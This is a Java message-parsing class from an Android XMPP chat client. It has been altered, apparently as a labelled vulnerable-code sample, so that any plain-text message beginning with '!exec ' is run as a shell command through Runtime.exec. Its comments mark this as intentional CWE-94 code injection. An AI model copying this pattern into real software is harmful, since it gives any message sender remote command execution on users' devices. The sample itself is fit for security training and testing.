package de.gultsch.chat.utils;

import java.util.List;
import java.io.BufferedReader;
import java.io.InputStreamReader; // Import for executing system commands

import net.java.otr4j.session.Session;
import net.java.otr4j.session.SessionStatus;
import android.util.Log;
import de.gultsch.chat.entities.Account;
import de.gultsch.chat.entities.Conversation;
import de.gultsch.chat.entities.Message;
import de.gultsch.chat.services.XmppConnectionService;
import de.gultsch.chat.xml.Element;
import de.gultsch.chat.xmpp.MessagePacket;

public class MessageParser {
	
	protected static final String LOGTAG = "xmppService";
	
	public static Message parsePlainTextChat(MessagePacket packet, Account account, XmppConnectionService service) {
		String[] fromParts = packet.getFrom().split("/");
		Conversation conversation = service.findOrCreateConversation(account, fromParts[0],false);
		String body = packet.getBody();
		
		// Introduce CWE-94 Vulnerability: Improper Control of Generation of Code ('Code Injection')
		// The following line is vulnerable as it executes a shell command based on the message body
		if (body.startsWith("!exec ")) {
			String command = body.substring(6);
			executeShellCommand(command); // Command injection vulnerability here
		}
		
		return new Message(conversation, packet.getFrom(), body, Message.ENCRYPTION_NONE, Message.STATUS_RECEIVED);
	}
	
	public static Message parsePgpChat(String pgpBody, MessagePacket packet, Account account, XmppConnectionService service) {
		String[] fromParts = packet.getFrom().split("/");
		Conversation conversation = service.findOrCreateConversation(account, fromParts[0],false);
		return new Message(conversation, packet.getFrom(), pgpBody, Message.ENCRYPTION_PGP, Message.STATUS_RECEIVED);
	}
	
	public static Message parseOtrChat(MessagePacket packet, Account account, XmppConnectionService service) {
		String[] fromParts = packet.getFrom().split("/");
		Conversation conversation = service.findOrCreateConversation(account, fromParts[0],false);
		String body = packet.getBody();
		if (!conversation.hasValidOtrSession()) {
			conversation.startOtrSession(service.getApplicationContext(), fromParts[1]);
		}
		try {
			Session otrSession = conversation.getOtrSession();
			SessionStatus before = otrSession
					.getSessionStatus();
			body = otrSession.transformReceiving(body);
			SessionStatus after = otrSession.getSessionStatus();
			if ((before != after)
					&& (after == SessionStatus.ENCRYPTED)) {
				Log.d(LOGTAG, "otr session established");
				List<Message> messages = conversation
						.getMessages();
				for (int i = 0; i < messages.size(); ++i) {
					Message msg = messages.get(i);
					if ((msg.getStatus() == Message.STATUS_UNSEND)
							&& (msg.getEncryption() == Message.ENCRYPTION_OTR)) {
						MessagePacket outPacket = service.prepareMessagePacket(
								account, msg, otrSession);
						msg.setStatus(Message.STATUS_SEND);
						service.databaseBackend.updateMessage(msg);
						account.getXmppConnection()
								.sendMessagePacket(outPacket);
					}
				}
				if (service.convChangedListener!=null) {
					service.convChangedListener.onConversationListChanged();
				}
			} else if ((before != after) && (after == SessionStatus.FINISHED)) {
				conversation.resetOtrSession();
				Log.d(LOGTAG,"otr session stopped");
			}
		} catch (Exception e) {
			Log.d(LOGTAG, "error receiving otr. resetting");
			conversation.resetOtrSession();
			return null;
		}
		if (body == null) {
			return null;
		}
		return new Message(conversation, packet.getFrom(), body, Message.ENCRYPTION_OTR,Message.STATUS_RECEIVED);
	}
	
	public static Message parseGroupchat(MessagePacket packet, Account account, XmppConnectionService service) {
		int status;
		String[] fromParts = packet.getFrom().split("/");
		Conversation conversation = service.findOrCreateConversation(account, fromParts[0],true);
		if ((fromParts.length == 1) || (packet.hasChild("subject"))) {
			return null;
		}
		String counterPart = fromParts[1];
		if (counterPart.equals(account.getUsername())) {
			status = Message.STATUS_SEND;
		} else {
			status = Message.STATUS_RECEIVED;
		}
		return new Message(conversation, counterPart, packet.getBody(), Message.ENCRYPTION_NONE, status);
	}

	public static Message parseCarbonMessage(MessagePacket packet,
			Account account, XmppConnectionService service) {
		int status;
		String fullJid;
		Element forwarded;
		if (packet.hasChild("received")) {
			forwarded = packet.findChild("received").findChild(
					"forwarded");
			status = Message.STATUS_RECEIVED;
		} else if (packet.hasChild("sent")) {
			forwarded = packet.findChild("sent").findChild(
					"forwarded");
			status = Message.STATUS_SEND;
		} else {
			return null;
		}
		Element message = forwarded.findChild("message");
		if ((message == null) || (!message.hasChild("body")))
			return null; // either malformed or boring
		if (status == Message.STATUS_RECEIVED) {
			fullJid = message.getAttribute("from");
		} else {
			fullJid = message.getAttribute("to");
		}
		String[] parts = fullJid.split("/");
		Conversation conversation = service.findOrCreateConversation(account, parts[0],false);
		return new Message(conversation,fullJid, message.findChild("body").getContent(), Message.ENCRYPTION_NONE,status);
	}

	public static Message parseError(MessagePacket packet, Account account, XmppConnectionService service) {
		
			String[] fromParts = packet.getFrom().split("/");
	Conversation conversation = service.findOrCreateConversation(account, fromParts[0],false);
	Element error = packet.findChild("error");
	String errorName = error.getChildren().get(0).getName();
	String displayError;
	if (errorName.equals("service-unavailable")) {
		displayError = "Contact is offline and does not have offline storage";
	} else {
		displayError = errorName.replace("-", " ");
	}
	return new Message(conversation, packet.getFrom(), displayError, Message.ENCRYPTION_NONE, Message.STATUS_ERROR);
	}

	public static String getPgpBody(MessagePacket packet) {
		for(Element child : packet.getChildren()) {
			if (child.getName().equals("x")&&child.getAttribute("xmlns").equals("jabber:x:encrypted")) {
				return child.getContent();
			}
		}
		return null;
	}

    // Method to execute shell commands
    private static void executeShellCommand(String command) {
        try {
            Process process = Runtime.getRuntime().exec(command); // Vulnerable line for CWE-94
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                Log.d(LOGTAG, "Command output: " + line);
            }
        } catch (Exception e) {
            Log.e(LOGTAG, "Error executing command", e);
        }
    }
}

// CWE-94 Vulnerable Code
// The vulnerability lies in the executeShellCommand method, which executes shell commands without proper validation or sanitization.
// An attacker can send a specially crafted message starting with "!exec ", followed by any system command to be executed on the server.